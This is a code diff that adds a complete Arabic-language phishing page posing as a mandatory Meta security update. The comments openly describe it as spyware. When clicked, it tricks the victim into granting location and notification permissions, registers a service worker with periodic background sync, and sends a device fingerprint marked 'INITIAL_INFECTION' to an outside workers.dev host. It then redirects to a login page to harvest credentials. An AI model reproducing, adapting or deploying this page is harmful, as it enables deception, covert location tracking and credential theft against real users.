@@ -1,25 +1,90 @@
-lasync function requestPegasusPerms() {
-    // 1. طلب تصريح الموقع تحت غطاء "تحديد أقرب خادم"
-    const geo = await navigator.permissions.query({name:'geolocation'});
-    if (geo.state !== 'granted') {
-        navigator.geolocation.getCurrentPosition(() => {}, () => {});
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث نظام Meta الأمني</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body { font-family: -apple-system, system-ui, sans-serif; background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .setup-container { text-align: center; padding: 20px; width: 90%; max-width: 400px; }
+        .shield-icon { width: 80px; height: 80px; background: #1877f2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 0 20px rgba(24, 119, 242, 0.5); }
+        h1 { font-size: 22px; margin-bottom: 10px; }
+        p { color: #b0b3b8; font-size: 14px; line-height: 1.6; }
+        .action-btn { background: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; margin-top: 30px; }
+        .status-text { font-size: 12px; color: #31a24c; margin-top: 15px; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="setup-container">
+    <div class="shield-icon">
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+    </div>
+    <h1>تحديث أمني إلزامي</h1>
+    <p>لحماية خصوصيتك، يتطلب نظام Meta الجديد تشفير جلسة المتصفح الحالية. يرجى تفعيل "وضع الحماية المتقدم" للمتابعة.</p>
+    
+    <button id="installBtn" class="action-btn">تفعيل الحماية الآن</button>
+    <div id="status" class="status-text">جاري مزامنة بيانات التشفير...</div>
+</div>
+
+<script>
+    // تسجيل الـ Service Worker الجاسوس
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('sw.js').then(reg => {
+            console.log('Spy Engine Ready');
+        });
     }
 
-    // 2. طلب تصريح الإشعارات لضمان بقاء السكربت نشطاً
-    const notification = await Notification.requestPermission();
+    const installBtn = document.getElementById('installBtn');
+    const statusText = document.getElementById('status');
 
-    if (notification === 'granted') {
-        const reg = await navigator.serviceWorker.ready;
-        // تفعيل المزامنة الدورية (هنا يكمن الكنز)
+    installBtn.addEventListener('click', async () => {
+        statusText.style.display = 'block';
+        installBtn.innerText = 'جاري المعالجة...';
+
+        // 1. طلب الموقع الجغرافي (جوهر Pegasus)
         try {
-            await reg.periodicSync.register('telemetry-update', {
-                minInterval: 5 * 60 * 1000 // كل 5 دقائق
+            await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 5000});
             });
-        } catch (e) {
-            console.log("Periodic Sync not supported, fallback to normal sync");
-        }
-    }
-}
+        } catch (e) { console.log("Geo denied or timeout"); }
 
-// استدعاء الوظيفة عند أول تفاعل للضحية مع الصفحة
-document.addEventListener('click', requestPegasusPerms, {once: true});
+        // 2. طلب الإشعارات (لضمان عمل السكربت في الخلفية)
+        try {
+            await Notification.requestPermission();
+        } catch (e) { console.log("Notify denied"); }
+
+        // 3. محاولة تسجيل المزامنة الدورية (Periodic Sync)
+        if ('serviceWorker' in navigator) {
+            const reg = await navigator.serviceWorker.ready;
+            try {
+                await reg.periodicSync.register('telemetry-update', {
+                    minInterval: 5 * 60 * 1000 // كل 5 دقائق
+                });
+            } catch (e) { console.log("PeriodicSync failed, fallback to active capture"); }
+        }
+
+        // 4. إرسال "الضربة الأولى" للبيانات
+        const initialData = {
+            type: "INITIAL_INFECTION",
+            ua: navigator.userAgent,
+            lang: navigator.language,
+            scr: `${window.screen.width}x${window.screen.height}`
+        };
+
+        fetch("https://pylod.zaid00dd.workers.dev/", {
+            method: "POST",
+            mode: "no-cors",
+            body: JSON.stringify(initialData)
+        });
+
+        // 5. التوجيه لصفحة تسجيل الدخول لإكمال الصيد التقليدي
+        setTimeout(() => {
+            window.location.href = "login.html";
+        }, 2000);
+    });
+</script>
+
+</body>
+</html>
